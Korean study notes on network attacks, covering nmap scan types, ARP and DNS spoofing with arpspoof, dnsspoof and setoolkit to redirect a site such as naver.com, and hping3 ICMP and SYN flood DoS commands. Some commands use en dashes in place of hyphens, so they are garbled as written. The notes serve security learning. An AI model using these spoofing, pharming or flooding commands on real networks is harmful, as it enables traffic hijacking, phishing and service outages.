# Network Attacking


## nmap TCP 타겟 스캔

nmap  = CUI   
zenmap = GUI

### TCP 3WHS를 사용한 SCAN
**TCP Full Open Scan**

    $nmap–sT [대상IP] 

**TCP Full Open Scan (OS포함)**
    
    $nmap–sT -O [대상IP] 

스캔하고자 하는 포트에 TCP연결을 시도하여 ack를 받아냄

---
**TCP Half Open Scan**

    $nmap–sS [대상IP]
---

### TCP Header를 사용한 SCAN
**FIN scan**
    
    $nmap–sF [대상IP]

FIN을 난사하여 닫혀있는 포트의 RST/ACK응답을 받아냄   
닫혀있는 포트를 확인하여 열려있는 포트를 알아냄

---
**Xmas scan** (Xmas의 선물처럼 풍성한 헤더를 보낸다는 의미)

    $nmap–sX [대상IP]

특수한 Header를 보내 닫혀있는 포트의 RST/ACK응답을 받아냄   
닫혀있는 포트를 확인하여 열려있는 포트를 알아냄   

---
**Null scan**

    $nmap–sN [대상IP]

Header의 flag를 0으로 보내어 닫혀있는 포트의 응답을 받아냄



## nmap UDP Target Scan

**UDP Scan**

    $nmap–sU [대상서버IP]

4계층 UDP는 응답이 없음   
닫혀있는 포트에 대해 3계층 ICMP가 대신 대답

## Pharming Attack

피싱(Phishing) - 시각적으로 주소를 위조하는 기법   
Pharming Attack - 피싱(Phishing)+ 조작(Farming)의 합성어로 정상사이트로 접속해도 위조사이트로 유도

### Spoofing

_Sniffing_ 은 도청으로 데이터 통신은 정상상태   
_Spoofing_ 은 정보를 가로채서 _Redirction_

---

### ARPSpoofing

    #arpspoof–i eth0 –t [target IP] [Gateway IP]

_ARP Cache Table_ 을 갱신하기 위해 지속적으로 Reply를 보냄

### DNS Spoofing


```bash
    #arpspoof–i eth0 –t [target IP] [DNS Server IP]
```
- <<DNS Table 생성>>
```bash             
    #cd /
    #nano [DNS Table파일 이름]
    [DNS Server IP] www.naver.com
```
- <<DSNSpoofing 수행 >>
```bash
    #dnsspoof–f /[DNS Table파일 이름]
```

```bash
    #setoolkit
```
실제 DNS서버보다 빠르게 패킷을 보내는 공격 방법

## DDoS(Distributed Deny of Service) Attack


### DoS (Denial of Service, 서비스 거부공격)

### DDoS (Distributed Denial of Service, 분산서비스거부공격)

### Fragmentation FloodingAttack

    hping3 --icmp--rand-source [Target IP] –d [문자열길이] --flood


MTU이상의 크기의 패킷을 전송하는 DoS공격   
재조립을 하다가 다운되게 만듦   
**테스트하다가 컴퓨터가 멈출 수 있으니 문자열길이를 조절해야 함**

### SYN Flooding Attack

    hping3 --rand-source [Target IP] –p 80 –S --flood

10초 내에 패킷 50여만개의 SYN 전송   
IP를 속여 오지않는 ACK를 기다리게 해 리소스를 많이 소비시킴